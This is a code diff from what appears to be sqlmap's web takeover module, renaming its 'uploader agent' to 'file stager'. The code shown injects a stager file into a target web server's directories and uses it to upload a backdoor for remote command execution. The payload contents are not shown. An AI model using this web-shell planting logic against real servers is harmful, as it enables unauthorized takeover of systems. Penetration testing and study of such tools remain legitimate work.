@@ -44,7 +44,7 @@ class Web:
         self.webApi         = None
         self.webBaseUrl     = None
         self.webBackdoorUrl = None
-        self.webUploaderUrl = None
+        self.webStagerUrl   = None
         self.webDirectory   = None
 
     def webBackdoorRunCmd(self, cmd):
@@ -84,11 +84,11 @@ class Web:
                                 "uploadDir": directory,
                               }
 
-            page = Request.getPage(url=self.webUploaderUrl, multipart=multipartParams, raise404=False)
+            page = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
             if "File uploaded" not in page:
                 warnMsg  = "unable to upload the backdoor through "
-                warnMsg += "the uploader agent on '%s'" % directory
+                warnMsg += "the file stager on '%s'" % directory
                 logger.warn(warnMsg)
                 return False
             else:
@@ -114,12 +114,12 @@ class Web:
         remote directory within the web server document root.
         """
 
-        if self.webBackdoorUrl is not None and self.webUploaderUrl is not None and self.webApi is not None:
+        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webApi is not None:
             return
 
         self.checkDbmsOs()
 
-        infoMsg = "trying to upload the uploader agent"
+        infoMsg = "trying to upload the file stager"
         logger.info(infoMsg)
 
         message  = "which web application language does the web server "
@@ -159,12 +159,12 @@ class Web:
         backdoorStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi), backdoorName)
         originalBackdoorContent = backdoorContent = backdoorStream.read()
 
-        uploaderName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
-        uploaderContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "uploader.%s_" % self.webApi))
+        stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
+        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
 
         for directory in directories:
-            # Upload the uploader agent
-            self.__webFileInject(uploaderContent, uploaderName, directory)
+            # Upload the file stager
+            self.__webFileInject(stagerContent, stagerName, directory)
             requestDir  = ntToPosixSlashes(directory)
 
             if requestDir[-1] != '/':
@@ -180,20 +180,20 @@ class Web:
             if requestDir[0] != '/':
                 requestDir = '/' + requestDir
 
-            self.webBaseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
-            self.webUploaderUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), uploaderName)
-            self.webUploaderUrl = ntToPosixSlashes(self.webUploaderUrl.replace("./", "/"))
-            uplPage, _  = Request.getPage(url=self.webUploaderUrl, direct=True, raise404=False)
+            self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
+            self.webStagerUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), stagerName)
+            self.webStagerUrl = ntToPosixSlashes(self.webStagerUrl.replace("./", "/"))
+            uplPage, _  = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
 
             if "sqlmap file uploader" not in uplPage:
-                warnMsg  = "unable to upload the uploader "
-                warnMsg += "agent on '%s'" % directory
+                warnMsg  = "unable to upload the file stager "
+                warnMsg += "on '%s'" % directory
                 logger.warn(warnMsg)
 
                 continue
 
-            infoMsg  = "the uploader agent has been successfully uploaded "
-            infoMsg += "on '%s' ('%s')" % (directory, self.webUploaderUrl)
+            infoMsg  = "the file stager has been successfully uploaded "
+            infoMsg += "on '%s' ('%s')" % (directory, self.webStagerUrl)
             logger.info(infoMsg)
 
             if self.webApi == "asp":
@@ -221,13 +221,13 @@ class Web:
 
             else:
                 if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
-                    warnMsg  = "backdoor hasn't been successfully uploaded "
-                    warnMsg += "with uploader probably because of permission "
-                    warnMsg += "issues."
+                    warnMsg  = "backdoor has not been successfully uploaded "
+                    warnMsg += "with file stager probably because of "
+                    warnMsg += "lack of write permission."
                     logger.warn(warnMsg)
 
                     message  = "do you want to try the same method used "
-                    message += "for uploader? [y/N] "
+                    message += "for the file stager? [y/N] "
                     getOutput = readInput(message, default="N")
 
                     if getOutput in ("y", "Y"):
